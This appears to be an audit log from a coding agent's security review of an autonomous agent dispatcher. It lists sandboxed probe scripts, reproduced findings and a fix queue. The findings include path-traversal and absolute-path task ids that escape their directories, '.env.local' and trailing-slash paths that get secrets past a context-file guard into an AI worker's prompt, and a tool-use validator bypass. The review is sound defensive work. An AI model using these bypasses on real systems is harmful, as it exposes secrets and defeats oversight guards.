- `python _codex_scratch/invoke_hook.py --hook <each event> --payload <synthetic json>`
- `python _codex_scratch/sandbox_repo/_codex_scratch/hook_events_stress.py`
- `python _codex_scratch/validator_fuzz_extra.py`
- `python tools/scripts/verify_synthesis_routine.py` and `python tools/scripts/verify_synthesis_recall.py` (pass + forced fail case)
- `python tools/scripts/jarvis_dispatcher.py` (sandbox loop repro, manually terminated on hang)
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_verify_backtest_cutoffs.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_verify_5e2_i8.py`
- `python _codex_scratch/probe_verify_producer_health_malformed.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_verify_5e1_i6_timestamp_bypass.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_verify_5e2_i6_runreport_blindspot.py`
- `cmd /c "tools\scripts\run_dispatcher.bat & echo EXITCODE:%errorlevel%"`
- `cmd /c "tools\scripts\run_heartbeat.bat & echo EXITCODE:%errorlevel%"`
- `cmd /c "tools\scripts\run_event_rotation.bat & echo EXITCODE:%errorlevel%"`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_retry_event_mismatch.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_failure_metric_retry_inflation.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_hook_events_malformed_input.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_no_verifiable_isc_stuck.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_routine_interval_zero_reinject.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_blocked_verify_stuck.py`
- `python _codex_scratch/isc_classifier_probe.py`
- `python -c "<compare weekly-synthesis ISC in routines.json vs task_backlog.jsonl>"`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_routine_schedule_type_ignored.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_routine_condition_fail_open.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_routine_interval_type_crash.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_dispatcher_recovers_inject_exception.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_routine_state_type_drift.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_bad_state_entry_blocks_other_routines.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_condition_value_crash_blocks_others.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_validate_context_files_bypass.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_context_bypass_selectable.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_context_bypass_prompt_exposure.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_verify_synthesis_routine_false_pass.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_pending_review_malformed_created_bypass.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_followon_state_malformed_crash.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_followon_negative_count_bypass.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_pending_review_archive_path_traversal.py`
- `python -c "<validate_task accepts id='../escape_pending_review_probe'>"`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_run_report_path_traversal.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_pending_review_archive_overwrite.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_archive_absolute_id_path.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_run_report_absolute_id_path.py`
- `python -c "<validate_task accepts id='C:/Users/Admin PC/epdev/data/abs_escape_probe'>"`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_save_run_report_explicit_path.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_followon_state_race.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_run_report_same_second_collision.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_routine_dedup_state_drift.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_malformed_backlog_line_crash.py`
- `python _codex_scratch/sandbox_repo/_codex_scratch/probe_missing_task_id_crash.py`

### Resume run (2026-04-10)

- Resumed dynamic-eval execution from existing harness state after session loss; reran probes from sandbox clone with `PYTHONPATH='.'`.
- `4.5` routines engine semantics revalidated:
  - `probe_routine_schedule_type_ignored.py` -> `monthly` schedule treated as interval logic; negative intervals inject immediately.
  - `probe_routine_interval_zero_reinject.py` -> routine with `interval_days=0` reinjects same day once prior row is `done`.
  - `probe_routine_condition_fail_open.py` -> unknown condition type still injects (`WARNING ... allowing injection`).
- `4.6` dispatcher/backlog lifecycle revalidated:
  - `probe_retry_event_mismatch.py` -> retry-queued task remains `pending` but emits `dispatcher.task_failed` and notification label `[FAILED]`.
  - `probe_no_verifiable_isc_stuck.py` -> non-verifiable task remains `pending` across repeated dispatcher runs (`Idle Is Success`), confirming livelock class.
- `4.13` rate-limit handling revalidated:
  - `python _codex_scratch/rate_limit_probe.py` -> emitted `WARN: rate limit detected` and wrote `_codex_scratch/rate_limit_probe_results.json` with 6 probe rows; rate-limit string detection still active.
- `4.14` synthesis pipeline verifier behavior revalidated:
  - `probe_verify_synthesis_routine_false_pass.py` still reproduces false-pass (`PASS: synthesis doc created today`) for non-synthesis markdown touched same day while queued signal exists.
- `4.9` dead-code scan revalidated (partial):
  - `vulture tools/scripts orchestration security/validators --min-confidence 80` still reports unreachable dispatcher code (`jarvis_dispatcher.py:2487`).
- Harness issue during dependency-resolver rerun:
  - `resolve_deps.py` attempted third-party installs and failed on package `collectors` build (`UltraMagicString...endswith`), but this did not block resumed probe execution.

### Resume run (2026-04-10, continued)

- `4.10` schema-drift pass executed with dedicated probes:
  - Primary repo probe (`_codex_scratch/schema_drift_resume.py`) confirms active backlog drift persists:
    - `72` rows, `24` distinct keysets, `0` malformed lines in current snapshot.
    - top keysets still vary by optional fields (`source`, `routine_id`, `goal_context`, `project`, `expected_outputs`, `failure_type`), confirming multi-shape contract in persisted rows.
  - Sandbox probe (`_codex_scratch/sandbox_repo/_codex_scratch/schema_drift_resume.py`) confirms dispatcher run-report shape stability in probe environment:
    - `5` reports, `1` keyset, all include `task_id` and `status`.
    - status distribution in sample is uniformly `failed` (expected for reproduced failure-path probes).
- Evidence artifact outputs written:
  - `_codex_scratch/schema_drift_resume.json`
  - `_codex_scratch/sandbox_repo/_codex_scratch/schema_drift_resume.json`
- Additional writer/reader robustness probe:
  - `_codex_scratch/sandbox_repo/_codex_scratch/probe_morning_summary_malformed_backlog.py`
  - Result: `tools/scripts/morning_summary.py --dry-run` exits `1` on a single malformed backlog JSONL row (`json.decoder.JSONDecodeError` in `get_backlog_status`), confirming fail-fast reader behavior for mixed-valid/malformed backlog data.

### Resume run (2026-04-10, continued #2)

- Follow-on state concurrency revalidation (tolerant probe):
  - `_codex_scratch/sandbox_repo/_codex_scratch/probe_followon_state_race_tolerant.py`
  - Result: `expected_count=1000`, `actual_count=179`, `lost_updates=821`, `worker_exceptions_caught=732`.
  - Confirms severe non-atomic update behavior remains even when worker exceptions are tolerated and run completes.
- Hook-event malformed-input behavior revalidated:
  - `_codex_scratch/sandbox_repo/_codex_scratch/hook_events_malformed_probe.py`
  - Result: malformed payload still exits `0` and appends synthetic success row (`hook='PostToolUse'`, `tool=''`, `success=true`, empty session).
- Hook-event concurrent write stress revalidated:
  - `_codex_scratch/sandbox_repo/_codex_scratch/hook_events_stress.py`
  - Result: `expected_after=5002`, `after_lines=4995`, `lost_lines=7`, `bad_json_lines=0`.
  - Confirms event log line loss under parallel write pressure.
- Event consumer impact check (`4.10` writer->reader drift effect):
  - `python tools/scripts/query_events.py --json` (sandbox after stress)
  - Result highlights telemetry skew:
    - `total_tool_calls=3984`
    - `top_tools=[["", 1997], ["Read", 1987]]`
  - Empty-tool rows dominate histogram, confirming malformed/defaulted writer rows materially distort reader health metrics.

### Resume run (2026-04-10, continued #3)

- Routine injection crash/starvation revalidation:
  - `probe_bad_state_entry_blocks_other_routines.py`:
    - `TypeError: fromisoformat: argument must be str`
    - `injected_count=null`, `backlog_rows=0` (single bad state entry aborts injection pass).
  - `probe_condition_value_crash_blocks_others.py`:
    - `ValueError: invalid literal for int() with base 10: 'abc'`
    - `injected_count=null`, `backlog_rows=0` (malformed condition blocks full pass).
  - `probe_routine_interval_type_crash.py`:
    - `TypeError: '<' not supported between instances of 'int' and 'str'` in routine interval compare.
  - `probe_dispatcher_recovers_inject_exception.py`:
    - Dispatcher emits warning and continues dispatch loop (`WARNING: inject_routines failed ...`), proving top-level recovery while routine injection still fails.
  - `probe_routine_dedup_state_drift.py`:
    - Dedup skip updates routine state (`state_after_dedup_skip=2026-04-10`) and suppresses future injection even after active row clears (`injected_second_after_clearing_active_row=0`).

- Archive/run-report path safety revalidation:
  - `probe_pending_review_archive_path_traversal.py`:
    - archive path resolves outside intended root (`.../data/escape_pending_review_probe.json`), `escaped_directory=true`.
  - `probe_archive_absolute_id_path.py`:
    - absolute-id variant writes outside sandbox archive root (`C:\\Users\\Admin PC\\epdev\\data\\abs_escape_probe.json`), `escaped_directory=true`.
  - `probe_run_report_path_traversal.py`:
    - `task_id` traversal escapes `dispatcher_runs` (`.../data/escape_run_report_probe_*.json`), `escaped_directory=true`.
  - `probe_run_report_absolute_id_path.py`:
    - absolute-id variant escapes run-report root (`C:\\Users\\Admin PC\\epdev\\data\\abs_run_report_probe_*.json`), `escaped_directory=true`.
  - `probe_save_run_report_explicit_path.py`:
    - explicit `path=` can write outside `dispatcher_runs` (`escaped_runs_root=true`).
  - `probe_run_report_same_second_collision.py`:
    - identical path for two writes in same second (`same_path=true`), second write overwrites first marker.

### Resume run (2026-04-10, continued #4)

- Queue-gating livelock revalidation:
  - `probe_blocked_verify_stuck.py` rerun:
    - task with blocked verify command remains `pending` across repeated dispatcher runs.
    - dispatcher message remains `Skipping ... no verifiable ISC ... Idle Is Success` (no escalation to `manual_review` / `failed`).

- Context-file guard bypass and exposure revalidation:
  - `probe_validate_context_files_bypass.py` rerun:
    - blocked: `.env`, `credentials.json`, `private.pem`, sibling absolute/relative escapes.
    - still allowed: `.env.local`, `credentials.json/`, `private.pem/` (trailing-slash bypass class persists).
  - `probe_context_bypass_selectable.py`:
    - `select_next_task` still returns task using bypassed context file (`selected_task_id='ctx-env-local'`).
  - `probe_context_bypass_prompt_exposure.py`:
    - generated worker prompt contains both `.env.local` synthetic secret and outside-repo sibling content.

- Pending-review TTL malformed-date bypass revalidation:
  - `probe_pending_review_malformed_created_bypass.py` rerun:
    - valid expired control auto-fails (`failure_type='pending_review_ttl'`),
    - malformed-date row remains `pending_review` with no failure type.

- Follow-on state robustness revalidation:
  - `probe_followon_state_malformed_crash.py` rerun:
    - `count` as string -> `TypeError` in throttle/emission helpers.
    - list root -> `AttributeError` (`.get` missing).
  - `probe_followon_negative_count_bypass.py` rerun:
    - throttle remains `true` across repeated emissions with negative count; state drifts to large negative values (`count=-996`).

- Backlog corruption crash revalidation:
  - `probe_malformed_backlog_line_crash.py` rerun:
    - dispatcher exits `1` with unhandled `JSONDecodeError` on one malformed JSONL row.
  - `probe_missing_task_id_crash.py` rerun:
    - dispatcher exits `1` with `KeyError: 'id'` in `deliverable_exists()`.

### Resume run (2026-04-10, continued #5)

- Verifier blind-spot revalidation:
  - `probe_verify_backtest_cutoffs.py`:
    - verifier still returns `exit 0` / PASS even with malformed non-dict `events` entries (`all 2 backtest event cutoffs are before ...`).
  - `probe_verify_5e1_i6_timestamp_bypass.py`:
    - seeded same-day timestamp-form follow-ons still produce `[PASS] I6 ... across 2 day(s), max 1/day`, indicating day-grouping bypass persists.
  - `probe_verify_5e2_i6_runreport_blindspot.py`:
    - seeded follow-on evidence in run reports still yields `[SKIP] I6 ... No follow-on tasks emitted yet`.
  - `probe_verify_5e2_i8.py`:
    - seeded historical run-report emissions with `followon_state.count=1` still returns PASS on I8 via state-file-only path.
  - `probe_verify_synthesis_routine_false_pass.py`:
    - still returns `PASS: synthesis doc created today` for non-synthesis markdown touch + queued signal.

- Hook/session telemetry stress continuation:
  - `hook_session_cost_stress.py`:
    - `before_lines=4996`, `after_lines=5996`, `expected_after=5996`, `lost_lines=0`, `bad_json_lines=0`.
    - Session-cost append path remains concurrency-safe in this run.
  - `hook_events_stress.py` (standalone rerun):
    - `before_lines=6863`, `after_lines=7983`, `expected_after=7863`, `lost_lines=0`, `bad_json_lines=0`.
    - Run completed without corruption; observed `after_lines > expected_after` indicates concurrent writers inflated line count during measurement window (non-isolated stress condition).

- Harness/runtime note:
  - Combined stress chain (`hook_session_cost_stress.py; hook_events_stress.py`) hung for >5 min in one attempt; process terminated and rerun as isolated command for stable capture.

### Resume run (2026-04-10, continued #6: deduped open criticals)

Priority-ordered list of still-reproducible issues to drive fix sequencing:

1) **Path traversal / boundary escape in archival + run-report writers (CRITICAL)**
   - Repro probes:
     - `probe_pending_review_archive_path_traversal.py`
     - `probe_archive_absolute_id_path.py`
     - `probe_run_report_path_traversal.py`
     - `probe_run_report_absolute_id_path.py`
     - `probe_save_run_report_explicit_path.py`
   - Current state: all still reproduce `escaped_directory=true` / outside-root writes.

2) **Verifier anti-criteria false-pass classes (CRITICAL/HIGH)**
   - Repro probes:
     - `probe_verify_5e1_i6_timestamp_bypass.py`
     - `probe_verify_5e2_i6_runreport_blindspot.py`
     - `probe_verify_5e2_i8.py`
     - `probe_verify_backtest_cutoffs.py`
     - `probe_verify_synthesis_routine_false_pass.py`
   - Current state: all still return PASS/SKIP where fail is expected under seeded forbidden conditions.

3) **Dispatcher queue liveness + crash integrity (HIGH)**
   - Repro probes:
     - `probe_blocked_verify_stuck.py`
     - `probe_no_verifiable_isc_stuck.py`
     - `probe_malformed_backlog_line_crash.py`
     - `probe_missing_task_id_crash.py`
   - Current state: blocked/non-verifiable tasks remain pending indefinitely; malformed/missing-id rows still crash dispatcher.

4) **Context-file guard bypass -> prompt data exposure (HIGH)**
   - Repro probes:
     - `probe_validate_context_files_bypass.py`
     - `probe_context_bypass_selectable.py`
     - `probe_context_bypass_prompt_exposure.py`
   - Current state: `.env.local` + trailing-slash secret path variants remain allowlisted and reachable in generated worker prompt context.

5) **Follow-on state safety and throttle correctness (MEDIUM->HIGH operational risk)**
   - Repro probes:
     - `probe_followon_state_malformed_crash.py`
     - `probe_followon_negative_count_bypass.py`
     - `probe_followon_state_race.py`
     - `probe_followon_state_race_tolerant.py`
   - Current state: malformed types crash helpers; negative count disables throttle; concurrent updates lose large fractions of increments.

6) **Routine injection starvation/fail-open semantics (MEDIUM)**
   - Repro probes:
     - `probe_bad_state_entry_blocks_other_routines.py`
     - `probe_condition_value_crash_blocks_others.py`
     - `probe_routine_interval_type_crash.py`
     - `probe_routine_schedule_type_ignored.py`
     - `probe_routine_interval_zero_reinject.py`
     - `probe_routine_dedup_state_drift.py`
   - Current state: malformed entries can abort/starve injection pass; schedule/interval semantics still accept degenerate values and dedup state can suppress legitimate reinjection.

7) **Hook-event malformed-input fail-open + telemetry skew (MEDIUM)**
   - Repro probes:
     - `hook_events_malformed_probe.py`
     - `hook_events_stress.py`
     - `query_events.py --json` (post-stress)
   - Current state: malformed hook payload still recorded as synthetic success with empty tool; empty-tool records skew top-tool metrics.

### Resume run (2026-04-10, continued #7: implementation-ready action queue)

Action items below are formatted for direct execution by Claude Code (fix + verify), highest-risk first.

1) **Harden archive path writes against traversal/absolute escape**
   - Target files:
     - `tools/scripts/jarvis_dispatcher.py` (`archive_expired_pending_review`)
     - `tools/scripts/lib/backlog.py` (`validate_task` id policy)
   - Required changes:
     - reject task ids containing path separators, drive prefixes, `..`, or absolute-path forms.
     - sanitize archive filename from canonical `task_id` allowlist (e.g., `[A-Za-z0-9._-]+`) before write.
     - enforce resolved output path under `data/pending_review_expired` via path-aware containment check.
   - Verify (must all pass):
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_pending_review_archive_path_traversal.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_archive_absolute_id_path.py`
     - expected: `escaped_directory=false`, outside-root files not created.

2) **Harden run-report path generation and explicit save path boundary**
   - Target files:
     - `tools/scripts/jarvis_dispatcher.py` (`save_run_report`, any caller passing explicit `path=`)
   - Required changes:
     - generate report filename with sanitized `task_id` + collision-resistant suffix (ns or monotonic counter).
     - disallow explicit `path` outside `data/dispatcher_runs`; normalize and enforce containment.
     - prevent same-second overwrite collisions for same task id.
   - Verify:
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_run_report_path_traversal.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_run_report_absolute_id_path.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_save_run_report_explicit_path.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_run_report_same_second_collision.py`
     - expected: no escapes; distinct filenames on rapid consecutive writes.

3) **Make falsification verifiers fail closed on data gaps / malformed evidence**
   - Target files:
     - `tools/scripts/verify_5e1_falsification.py`
     - `tools/scripts/verify_5e2_falsification.py`
     - `tools/scripts/verify_backtest_cutoffs.py`
     - `tools/scripts/verify_synthesis_routine.py`
   - Required changes:
     - if all checks SKIP due missing/invalid evidence, return nonzero (or explicit guarded FAIL after warm-up window).
     - in 5E-2 I8, include historical run-report day aggregation, not state-file only.
     - in 5E-1 I6, normalize timestamps to calendar day before throttle checks.
     - in backtest verifier, fail when events list contains non-dict rows or zero validated rows.
     - in synthesis routine verifier, require real synthesis artifact shape + signal-consumption evidence (not arbitrary touched `.md`).
   - Verify:
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_verify_5e1_i6_timestamp_bypass.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_verify_5e2_i6_runreport_blindspot.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_verify_5e2_i8.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_verify_backtest_cutoffs.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_verify_synthesis_routine_false_pass.py`
     - expected: each seeded forbidden-state probe exits nonzero.

4) **Stop dispatcher livelock for permanently non-executable verify criteria**
   - Target files:
     - `tools/scripts/jarvis_dispatcher.py`
     - `tools/scripts/lib/isc_common.py` (verify classification plumbing)
   - Required changes:
     - tasks skipped as blocked verify or permanently non-verifiable must transition to `manual_review` (or `failed`) with explicit reason.
     - preserve `pending` only for retry-eligible transient execution states.
   - Verify:
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_blocked_verify_stuck.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_no_verifiable_isc_stuck.py`
     - expected: status no longer remains `pending` across repeated runs.

5) **Make backlog readers robust to malformed rows and missing required fields**
   - Target files:
     - `tools/scripts/jarvis_dispatcher.py` (`read_backlog`, selection path)
     - `tools/scripts/morning_summary.py` (`get_backlog_status`)
   - Required changes:
     - per-line JSON decode guard with quarantine/skip + warning.
     - required-field validation before downstream usage (especially `id`).
   - Verify:
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_malformed_backlog_line_crash.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_missing_task_id_crash.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_morning_summary_malformed_backlog.py`
     - expected: no hard crash; malformed rows are reported and skipped.

6) **Close context-file path and secret suffix bypasses**
   - Target files:
     - `tools/scripts/jarvis_dispatcher.py` (`validate_context_files`, prompt assembly path)
   - Required changes:
     - canonicalize paths before checks; reject trailing-slash secret variants and `.env*` family consistently.
     - enforce repo containment using path-aware relative checks.
     - block task selection if any context file is invalid.
   - Verify:
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_validate_context_files_bypass.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_context_bypass_selectable.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_context_bypass_prompt_exposure.py`
     - expected: all bypass variants blocked; prompt does not contain blocked file contents.

7) **Stabilize follow-on throttle state under malformed data and concurrency**
   - Target files:
     - `tools/scripts/jarvis_dispatcher.py` (follow-on state read/modify/write helpers)
   - Required changes:
     - schema validate `followon_state.json` and fail closed/recover on malformed types.
     - clamp count to non-negative; repair invalid state before evaluating throttle.
     - serialize updates with lock/atomic replace across workers.
   - Verify:
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_followon_state_malformed_crash.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_followon_negative_count_bypass.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_followon_state_race.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_followon_state_race_tolerant.py`
     - expected: no exceptions, no negative-count bypass, final count integrity preserved.

8) **Routine injection hardening to avoid starvation and degenerate cadence**
   - Target files:
     - `tools/scripts/jarvis_dispatcher.py` (`inject_routines` and helpers)
   - Required changes:
     - isolate per-routine parse/condition errors (continue loop, do not abort all).
     - validate `interval_days` type/range and schedule semantics explicitly.
     - do not advance `last_injected` when dedup-skipped due existing active row.
   - Verify:
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_bad_state_entry_blocks_other_routines.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_condition_value_crash_blocks_others.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_routine_interval_type_crash.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_routine_schedule_type_ignored.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_routine_interval_zero_reinject.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/probe_routine_dedup_state_drift.py`
     - expected: malformed routines do not starve others; cadence semantics enforced; dedup does not suppress valid future injections.

9) **Hook-event parser must fail closed on malformed stdin**
   - Target files:
     - `tools/scripts/hook_events.py`
     - optional readers: `tools/scripts/query_events.py`, `tools/scripts/vitals_collector.py`
   - Required changes:
     - malformed payloads emit explicit parse-error record or nonzero exit (never synthetic success).
     - ignore empty-tool rows in top-tools aggregation to avoid metric poisoning.
   - Verify:
     - `python _codex_scratch/sandbox_repo/_codex_scratch/hook_events_malformed_probe.py`
     - `python _codex_scratch/sandbox_repo/_codex_scratch/hook_events_stress.py`
     - `python tools/scripts/query_events.py --json`
     - expected: malformed payloads not counted as successful tool events; top_tools no longer dominated by empty tool names.

### Resume run (2026-04-10, continued #8: remaining action items backlog)

Remaining count snapshot:
- Total findings logged: 66
- Action-queue items already enumerated: 9 (high-impact grouped)
- Remaining raw line-items not yet explicitly queued: ~57 (many overlap into ~18-22 themes)

10) **Fix hook command portability across hosts/shells**
   - Target files:
     - `.claude/settings.json` hook command entries
     - hook wrapper scripts under `tools/scripts/` if needed
   - Required changes:
     - remove user-specific absolute host paths.
     - resolve Python interpreter deterministically (`sys.executable` wrapper or repo-managed launcher).
     - quote paths for spaces in Windows paths.
   - Verify:
     - `python _codex_scratch/invoke_hook.py --hook PreToolUse --payload _codex_scratch/payload_pretool_bash.json`
     - repeat for `UserPromptSubmit`, `Notification`, `PostToolUse`, `PostCompact`, `Stop`.
     - expected: no `9009`/path-not-found failures.

11) **Close autonomous validator schema mismatch (`tool/tool_name`)**
   - Target files:
     - `security/validators/validate_tool_use.py`
     - tests in `tests/defensive/` covering validator payload schema
   - Required changes:
     - normalize canonical and hook-style payload keys before checks.
     - enforce equivalent block/allow behavior across both payload schemas.
   - Verify:
     - replay canonical vs hook-shape payload probes used in `REVIEW.md` findings.
     - expected: hook-shape no longer bypasses protections.

12) **Extend secret/file protections beyond Read/Write to all file-addressing tools**
   - Target files:
     - `security/validators/validate_tool_use.py`
   - Required changes:
     - apply secret-path + worktree containment rules to `Glob`/`Grep` equivalents and inline interpreter file reads.
     - align path normalization and suffix handling.
   - Verify:
     - rerun `.env` access probes for `Read`, `Glob`, `Grep`, python/node inline file reads.
     - expected: consistent block behavior for secret-targeting access paths.

13) **Fail closed in autonomous mode when worktree root is unset**
   - Target files:
     - `security/validators/validate_tool_use.py`
   - Required changes:
     - if `JARVIS_SESSION_TYPE=autonomous` and no `JARVIS_WORKTREE_ROOT`, block write/edit/path-targeting operations by default.
   - Verify:
     - autonomous env without root + out-of-repo write probe.
     - expected: explicit block with reason, not allow.

14) **Fix Windows cp1252 output hazards (primary crash + residual glyph debt)**
   - Target files:
     - `tools/scripts/voice_inbox_sync.py` (primary)
     - `tools/scripts/hook_post_compact.py` and other reported emitters
   - Required changes:
     - replace non-ASCII glyph output in CLI paths or sanitize to ASCII before print/log.
   - Verify:
     - rerun cp1252 smoke (`_codex_scratch/cp1252_smoke.py`) and affected tests.
     - expected: no `UnicodeEncodeError` and no replacement glyph artifacts in critical paths.

15) **Address rate-limit exit-0 handling gaps in Claude consumers**
   - Target files:
     - `tools/scripts/morning_feed.py`
     - `tools/scripts/self_diagnose_wrapper.py`
     - any additional `claude -p` consumers
   - Required changes:
     - inspect stdout for rate-limit strings and treat as failure/retry, not success.
   - Verify:
     - use fake Claude rate-limit mode + script probes.
     - expected: rate-limit runs produce explicit non-success state.

16) **Fix dispatcher branch/deliverable false-closure heuristics**
   - Target files:
     - `tools/scripts/jarvis_dispatcher.py` (`deliverable_exists`, branch checks)
   - Required changes:
     - avoid declaring “already done” from ISC text collisions or unrelated branch name collisions.
     - tie closure to stronger task identity evidence.
   - Verify:
     - rerun deliverable collision probes.
     - expected: unrelated tasks remain selectable; no false auto-close.

17) **Routine injection with empty backlog and dirty-tree behavior**
   - Target files:
     - `tools/scripts/jarvis_dispatcher.py`
   - Required changes:
     - ensure routine injection can run even when backlog starts empty.
     - prevent dirty-tree spin loops by routing/deferring appropriately.
   - Verify:
     - rerun empty-backlog and dirty-root probes in sandbox.
     - expected: no spin; routine tasks inject as designed.

18) **Backlog integrity: duplicate IDs and schema migration guardrails**
   - Target files:
     - `tools/scripts/lib/backlog.py`
     - migration utility (new or existing script)
     - `tools/scripts/backlog_dashboard.py`
   - Required changes:
     - enforce id uniqueness at append time.
     - add migration/repair tool for existing duplicate IDs.
     - surface duplicate-id integrity warnings in dashboard JSON and terminal output.
   - Verify:
     - duplicate-id append probe and dashboard output check.
     - expected: duplicates rejected/flagged; dashboard reports integrity breach.

19) **Event/reporting fidelity: include dispatcher failures in health rollups**
   - Target files:
     - `tools/scripts/query_events.py`
     - notifier/event emission points in `tools/scripts/jarvis_dispatcher.py`
   - Required changes:
     - incorporate dispatcher failure/retry hooks into failure-rate metrics.
     - distinguish `retrying` from terminal `failed`.
   - Verify:
     - rerun retry-event mismatch probe + `query_events.py --json`.
     - expected: failure stats/labels align with actual task lifecycle.

20) **Security scanner pattern refresh**
   - Target files:
     - `security/validators/secret_scanner.py`
   - Required changes:
     - add modern key variants (e.g., `sk-proj-`) and maintain regex list tests.
   - Verify:
     - unit/probe lines for old + new key shapes.
     - expected: both variants detected.

21) **Defensive test suite rehab for currently non-runnable/insufficient tests**
   - Target files:
     - `tests/defensive/test_trust_topology.py`
     - `tests/defensive/test_injection_detection.py`
     - `tests/test_path_guard.py`
     - `tests/test_path_guard_edge.py`
     - `tests/defensive/test_hooks.py`
     - `tests/self_heal/test_baseline.py`
   - Required changes:
     - remove import-time exits, convert script-only checks into pytest tests, fix import paths, and align stale baselines.
   - Verify:
     - `pytest -xvs tests/defensive`
     - targeted pytest invocation for path-guard + self-heal files.
     - expected: tests run under pytest (not script-only), no collection crashes from these modules.

22) **Operational hygiene: stale absolute root_dir and hardcoded host paths**
   - Target files:
     - `heartbeat_config.json`
     - scripts flagged in hardcoded-path findings
   - Required changes:
     - replace stale absolute roots with repo-relative or env-driven configuration.
     - add startup validation that config root exists and belongs to current repo host context.
   - Verify:
     - run `rotate_events.py`, scheduler wrappers, and startup checks in sandbox.
     - expected: no silent no-op caused by host-path mismatch.

### Resume run (2026-04-10, continued #9: long-tail closure items + queue completion)

23) **Fix scheduler wrapper exit-code propagation**
   - Target files:
     - `tools/scripts/run_dispatcher.bat`
     - `tools/scripts/run_heartbeat.bat`
     - `tools/scripts/run_event_rotation.bat`
   - Required changes:
     - fail fast on path/setup errors and propagate child process nonzero exit to wrapper exit code.
   - Verify:
     - run wrappers in sandbox-mismatch context (current repro method in report).
     - expected: wrapper exits nonzero when target path/process fails.

24) **Improve notifier/event semantic accuracy for retrying tasks**
   - Target files:
     - `tools/scripts/jarvis_dispatcher.py` (event emit + notify formatting)
   - Required changes:
     - emit retry-specific event type/state (`dispatcher.task_retry` or equivalent).
     - avoid labeling pending-retry as terminal FAILED.
   - Verify:
     - rerun `probe_retry_event_mismatch.py`.
     - expected: event + notification indicate retry/pending state correctly.

25) **Fix pending-review archive overwrite on duplicate ids**
   - Target files:
     - `tools/scripts/jarvis_dispatcher.py` archive writer
   - Required changes:
     - include collision-safe suffix (timestamp_ns/counter) or dedupe-safe overwrite guard.
   - Verify:
     - rerun `probe_pending_review_archive_overwrite.py`.
     - expected: second write does not silently overwrite prior archive record.

26) **Stabilize hook event schema contract at write boundary**
   - Target files:
     - `tools/scripts/hook_events.py`
   - Required changes:
     - enforce required fields/types before append; quarantine malformed rows.
     - include explicit event subtype for parse/shape failures.
   - Verify:
     - malformed payload probe + stress probe.
     - expected: no synthetic success defaults; no empty-tool dominance in downstream analytics.

27) **Reduce warning flood in backlog append path**
   - Target files:
     - `tools/scripts/lib/backlog.py`
   - Required changes:
     - rate-limit or summarize repeated identical warnings (e.g., missing `expected_outputs`).
   - Verify:
     - rerun backlog append stress and inspect log volume/profile.
     - expected: warning count bounded with summary output.

28) **CLI contract cleanup for `branch_lifecycle.py --help`**
   - Target files:
     - `tools/scripts/branch_lifecycle.py`
   - Required changes:
     - add argparse-driven help path; prevent side-effect execution on `--help`.
   - Verify:
     - `python tools/scripts/branch_lifecycle.py --help`
